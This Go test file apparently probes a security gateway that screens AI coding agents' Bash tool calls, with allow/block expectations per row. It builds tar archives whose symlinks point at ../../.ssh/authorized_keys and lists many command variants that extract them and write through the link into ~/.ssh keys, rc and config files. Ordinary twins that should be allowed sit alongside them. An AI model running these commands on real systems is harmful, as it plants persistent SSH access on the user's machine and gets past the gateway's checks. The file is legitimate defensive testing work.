// Reviewer probe round 4 (not committed): new near variants for gx054 r4, base vs head.
package gateway

import (
	"archive/tar"
	"compress/gzip"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func rv5xTgz(t *testing.T, path string, members int, headers ...tar.Header) {
	t.Helper()
	file, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	defer file.Close()
	zw := gzip.NewWriter(file)
	tw := tar.NewWriter(zw)
	for _, h := range headers {
		h.Mode = 0o755
		tw.WriteHeader(&h)
	}
	for i := 0; i < members; i++ {
		tw.WriteHeader(&tar.Header{Name: fmt.Sprintf("pkg-1.0/src/f%05d.c", i), Typeflag: tar.TypeReg, Mode: 0o644, Size: 2})
		tw.Write([]byte("x\n"))
	}
	tw.Close()
	zw.Close()
}

func rv5xExtra(t *testing.T, f b36ManagedHookFixture) {
	t.Helper()
	p := f.project
	dir := func(n string) tar.Header { return tar.Header{Name: n, Typeflag: tar.TypeDir} }
	reg := func(n string) tar.Header { return tar.Header{Name: n, Typeflag: tar.TypeReg} }
	sym := func(n, l string) tar.Header { return tar.Header{Name: n, Typeflag: tar.TypeSymlink, Linkname: l} }
	// readable archives with ordinary (non-protected) links
	rv5xTgz(t, filepath.Join(p, "pkglink.tgz"), 0, dir("pkg-1.0/"), reg("pkg-1.0/configure"), dir("pkg-1.0/lib/"), reg("pkg-1.0/lib/libx.so.1"), sym("pkg-1.0/lib/libx.so", "libx.so.1"))
	rv5xTgz(t, filepath.Join(p, "nodebin.tgz"), 0, dir("node-v20/"), dir("node-v20/bin/"), reg("node-v20/lib/npm-cli.js"), sym("node-v20/bin/npm", "../lib/npm-cli.js"), sym("node-v20/bin/npx", "../lib/npm-cli.js"))
	// over-member archive with an ordinary link read before the cap
	rv5xTgz(t, filepath.Join(p, "nodelink.tgz"), 5000, dir("pkg-1.0/"), reg("pkg-1.0/lib/libx.so.1"), sym("pkg-1.0/lib/libx.so", "libx.so.1"))
	// over-member archive whose keys link sits past the member cap (bound hit: Possible)
	{
		file, _ := os.Create(filepath.Join(p, "lateln.tgz"))
		zw := gzip.NewWriter(file)
		tw := tar.NewWriter(zw)
		for i := 0; i < 5000; i++ {
			tw.WriteHeader(&tar.Header{Name: fmt.Sprintf("f%05d", i), Typeflag: tar.TypeReg, Mode: 0o644, Size: 0})
		}
		tw.WriteHeader(&tar.Header{Name: "p", Typeflag: tar.TypeSymlink, Linkname: "../../.ssh/authorized_keys", Mode: 0o777})
		tw.Close()
		zw.Close()
		file.Close()
	}
	// over-member archive whose keys link is the first member (read: Named)
	rv5xTgz(t, filepath.Join(p, "earlyln.tgz"), 5000, sym("p", "../../.ssh/authorized_keys"))
	raw, _ := os.ReadFile(filepath.Join(p, "pkg.tgz"))
	os.WriteFile(filepath.Join(p, "release.tgz"), raw, 0o600)
	for _, n := range []string{"pkg.tgz.gpg", "pkg.enc", "link.enc", "link.tar.gpg"} {
		os.WriteFile(filepath.Join(p, n), []byte("opaque bytes\n"), 0o600)
	}
	os.WriteFile(filepath.Join(p, "fix.patch"), []byte("--- a/notes.txt\n+++ b/notes.txt\n@@ -1 +1,2 @@\n x\n+y\n"), 0o600)
	os.WriteFile(filepath.Join(p, "parts.txt"), []byte("link.part1 link.part2\n"), 0o600)
	os.WriteFile(filepath.Join(p, "Makefile"), []byte("all:\n\ttrue\n"), 0o600)
	stage := filepath.Join(filepath.Dir(f.homes), "stage")
	if b, err := exec.Command("sh", "-c", "cd "+stage+" && printf \"p\\n\" | cpio -o -H newc > "+filepath.Join(p, "link.cpio")+" 2>/dev/null && printf \"pkg-1.0\\npkg-1.0/a.c\\n\" | cpio -o -H newc > "+filepath.Join(p, "pkg.cpio")+" 2>/dev/null").CombinedOutput(); err != nil {
		t.Logf("SKIP cpio: %v %s", err, b)
	}
}

func TestRV5Extra(t *testing.T) {
	rows := []struct{ id, cmd string }{
		// must-fix 1 producer forms with a keys-link archive: followed = Named (block all); unfollowable = Possible (W R W R)
		{"E01", "tar -xf <(cat link.tar | cat) -C d1 && echo k >> d1/p"},
		{"E02", "tar -xf - -C d1 < <(gzip -dc link.tgz | cat) && echo k >> d1/p"},
		{"E03", "tar -xf - -C d1 < <(cat link.part1 link.part2) && echo k >> d1/p"},
		{"E04", "curl -fsSL https://example.com/x.tar | tar -x -C d1 && echo k >> d1/p"},
		{"E05", "curl -fsSL \"$URL\" | tar -x -C d1 && echo k >> d1/p"},
		{"E06", "a=(link.tar); tar -xf \"${a[0]}\" -C d1 && echo k >> d1/p"},
		{"E07", "a=(link.tar d1); tar -xf \"${a[@]:0:1}\" -C d1 && echo k >> d1/p"},
		{"E08", "tar -xf \"$(cat list.txt)\" -C d1 && echo k >> d1/p"},
		{"E09", "cat $(cat parts.txt) > c.tar; tar -xf c.tar -C d1; echo k >> d1/p"},
		{"E10", "cat link.part1 link.part2 > c.tar; tar -xf c.tar -C d1; echo k >> d1/p"},
		{"E11", "cat link.part1 link.part2 > c.tar && gzip c.tar && tar -xzf c.tar.gz -C d1 && echo k >> d1/p"},
		{"E12", "{ cat link.part1 link.part2 > c.tar; }; tar -xf c.tar -C d1; echo k >> d1/p"},
		{"E13", "pv link.tar | tar -xf - -C d1 && echo k >> d1/p"},
		{"E14", "openssl enc -d -aes-256-cbc -pass pass:x -in link.enc | tar -xf - -C d1 && echo k >> d1/p"},
		{"E15", "gpg -d link.tar.gpg | tar -xf - -C d1 && echo k >> d1/p"},
		{"E16", "bsdtar -cf - @link.tar | tar -xf - -C d1 && echo k >> d1/p"},
		{"E17", "bsdtar -xf link.tar -C d1 && echo k >> d1/p"},
		{"E18", "cd d1 && cpio -idm < ../link.cpio && echo k >> p"},
		{"E19", "cd d1 && pax -r -f ../link.tar && echo k >> p"},
		{"E20", "cd d1 && pax -r < ../link.tar && echo k >> p"},
		{"E21", "tar -xf link.tar -C d1 || true; echo k >> d1/p"},
		{"E22", "(cat link.tar) | tar -xf - -C d1 && echo k >> d1/p"},
		{"E23", "cat link.tar | pv | tar -xf - -C d1 && echo k >> d1/p"},
		{"E24", "f=link.tar; cp \"$f\" x.tar && tar -xf x.tar -C d1 && echo k >> d1/p"},
		{"E25", "tar -xf link.tar -C d1 & wait; echo k >> d1/p"},
		{"E26", "tar -xf lateln.tgz -C d1 && echo k >> d1/p"},
		{"E27", "tar -xf earlyln.tgz -C d1 && echo k >> d1/p"},
		// ordinary twins of unfollowable producers: expect balanced allow (W), strict block
		{"U01", "curl -fsSL https://example.com/pkg.tgz > dl.tgz && tar xzf dl.tgz && ./configure > build.log"},
		{"U02", "git archive --format=tar HEAD > rel.tar && tar -xf rel.tar -C app && echo ok > app/BUILD"},
		{"U03", "wget -qO- https://example.com/pkg.tgz | tar -xz && ./configure > build.log"},
		{"U04", "curl -fsSL \"$URL\" | tar -xz && ./configure > build.log"},
		{"U05", "gpg -d pkg.tgz.gpg | tar -xz && ./configure > build.log"},
		{"U06", "openssl enc -d -aes-256-cbc -pass pass:x -in pkg.enc | tar -xz && make > build.log"},
		{"U07", "pv pkg.tgz | tar -xz && ./configure > build.log"},
		{"U08", "npm pack && tar -xzf demo-1.0.0.tgz && cat package/package.json > pkg.json"},
		{"U09", "ssh build cat /srv/pkg.tgz | tar -xz && make > build.log"},
		{"U10", "curl -fsSL -o dl.tgz https://example.com/pkg.tgz && tar xzf dl.tgz && ./configure > build.log"},
		{"U11", "cpio -idm < pkg.cpio && echo ok > build-note.txt"},
		{"U12", "tar -xzf - < <(curl -fsSL https://example.com/pkg.tgz) && make > build.log"},
		// readable archives proven to hold no protected link: expect balanced allow everywhere it is ordinary
		{"Q01", "tar xzf pkglink.tgz && ./configure > build.log"},
		{"Q02", "tar xzf pkglink.tgz && cd pkg-1.0 && ./configure > config.log 2>&1"},
		{"Q03", "tar xzf pkglink.tgz && make > make.log 2>&1"},
		{"Q04", "tar -xzf pkglink.tgz -C app && echo ok > app/pkg-1.0/BUILD"},
		{"Q05", "tar xzf nodebin.tgz && cd node-v20 && ./configure > build.log"},
		{"Q06", "tar xzf nodelink.tgz && ./configure > build.log"},
		{"Q07", "tar -xzf release.tgz && make"},
		{"Q08", "tar -xzf release.tgz && make > build.log"},
		{"Q09", "git apply fix.patch && make > build.log"},
		{"Q10", "tar -xzf pkg.tgz && git apply fix.patch && make > build.log"},
		{"Q11", "tar xJf pkg.txz && ./configure > build.log"},
		{"Q12", "tar --zstd -xf pkg.tzst && ./configure > build.log"},
		{"Q13", "zstd -dc pkg.tzst | tar -xf - && ./configure > build.log"},
		{"Q14", "tar xjf pkg.tbz && ./configure > build.log"},
		{"Q15", "gzip -dc pkg.tgz | tar -xf - && ./configure > build.log"},
		{"Q16", "tar -xzf pkg.tgz -C app && npm --prefix app/pkg-1.0 run build > build.log"},
		{"Q17", "patch -p1 < fix.patch && make > build.log"},
		{"Q18", "tar -xzf release.tgz && cd pkg-1.0 && make > ../build.log 2>&1"},
		// must-fix 4: copiers through a proven extracted ~/.ssh directory link (d1/s) and keys file link (d1/p): block all
		{"W01", "tar -xf sshdir.tar -C d1 && cp a.txt d1/s/authorized_keys"},
		{"W02", "tar -xf sshdir.tar -C d1 && cp -r a.txt d1/s/authorized_keys"},
		{"W03", "tar -xf sshdir.tar -C d1 && install -m 600 a.txt d1/s/authorized_keys"},
		{"W04", "tar -xf sshdir.tar -C d1 && rsync a.txt d1/s/authorized_keys"},
		{"W05", "tar -xf sshdir.tar -C d1 && ditto a.txt d1/s/authorized_keys"},
		{"W06", "tar -xf sshdir.tar -C d1 && mv a.txt d1/s/authorized_keys"},
		{"W07", "tar -xf sshdir.tar -C d1 && ln -f a.txt d1/s/authorized_keys"},
		{"W08", "tar -xf sshdir.tar -C d1 && ln -sf ../project/a.txt d1/s/authorized_keys"},
		{"W09", "tar -xf sshdir.tar -C d1 && tee d1/s/authorized_keys < a.txt"},
		{"W10", "tar -xf sshdir.tar -C d1 && dd if=a.txt of=d1/s/authorized_keys status=none"},
		{"W11", "tar -xf sshdir.tar -C d1 && cp a.txt d1/s/rc"},
		{"W12", "tar -xf sshdir.tar -C d1 && install a.txt d1/s/config"},
		{"W13", "tar -xf sshdir.tar -C d1 && tee -a d1/s/config < a.txt"},
		{"W14", "tar -xf sshdir.tar -C d1 && cp -r conf d1/s/"},
		{"W15", "tar -xf sshdir.tar -C d1 && rsync -a conf/ d1/s/"},
		{"W16", "tar -xf link.tar -C d1 && cp a.txt d1/p"},
		{"W17", "tar -xf link.tar -C d1 && install a.txt d1/p"},
		{"W18", "tar -xf link.tar -C d1 && rsync a.txt d1/p"},
		{"W19", "tar -xf link.tar -C d1 && ditto a.txt d1/p"},
		{"W20", "tar -xf link.tar -C d1 && tee d1/p < a.txt"},
		{"W21", "tar -xf link.tar -C d1 && dd if=a.txt of=d1/p status=none"},
		{"W22", "tar -xf link.tar -C d1 && cp -r a.txt d1/p"},
		{"W23", "tar -xf ~/project/sshdir.tar -C ~/project/d1 && install -m 600 ~/project/a.txt $HOME/project/d1/s/rc"},
		{"W24", "tar -xf ~/project/sshdir.tar -C ~/project/d1 && cp ~/project/a.txt \"$HOME\"/project/d1/s/authorized_keys"},
		{"W25", "tar -xf sshdir.tar -C d1 && cp -t d1/s a.txt"},
		{"W26", "tar -xf sshdir.tar -C d1 && install -t d1/s a.txt"},
		{"W27", "tar -xf sshdir.tar -C d1 && mv -t d1/s a.txt"},
		{"W28", "tar -xf sshdir.tar -C d1 && cp a.txt d1/s/"},
		{"W29", "tar -xf sshdir.tar -C d1 && mv a.txt d1/s"},
		{"W30", "tar -xf sshdir.tar -C d1 && tar -xf pkg.tgz -C d1/s"},
		// copier ordinary twins through an extracted ordinary link: expect balanced allow
		{"V01", "tar xzf pkglink.tgz && cp a.txt pkg-1.0/lib/libx.so"},
		{"V02", "tar xzf pkglink.tgz && install -m 644 a.txt pkg-1.0/lib/"},
		{"V03", "tar xzf pkglink.tgz && rsync -a conf/ pkg-1.0/conf/"},
	}
	for _, row := range rows {
		t.Run(row.id, func(t *testing.T) {
			f := rv5oFixture(t)
			rv5Extra(t, f)
			rv5xExtra(t, f)
			t.Setenv("DEFENSECLAW_HOME", t.TempDir())
			t.Setenv("URL", "https://example.com/pkg.tgz")
			var out []string
			start := time.Now()
			for _, connector := range []string{"claudecode", "codex"} {
				var cells []string
				for _, cell := range []struct {
					pack    string
					managed bool
				}{{"", false}, {"strict", false}, {"", true}, {"strict", true}} {
					os.Chmod(f.homes, 0o700)
					id := fmt.Sprintf("rv5x-%s-%s-%t", row.id, cell.pack, cell.managed)
					body := map[string]any{"session_id": id, "hook_event_name": "PreToolUse", "cwd": f.project, "permission_mode": "default", "tool_name": "Bash", "tool_use_id": id, "tool_input": map[string]any{"command": row.cmd}}
					if connector == "codex" {
						body["turn_id"] = "t-" + id
					}
					payload := mustJSON(t, body)
					header := rv5Header(t, f, connector, payload)
					cells = append(cells, rv5oPost(t, f.homes, f.home, connector, cell.pack, payload, header, cell.managed))
				}
				out = append(out, strings.Join(cells, " "))
			}
			rv5AssertCells(t, "extra/"+row.id, out)
			t.Logf("XROW|%s|%s|%s|%dms", row.id, strings.Join(out, " | "), row.cmd, time.Since(start).Milliseconds())
		})
	}
}
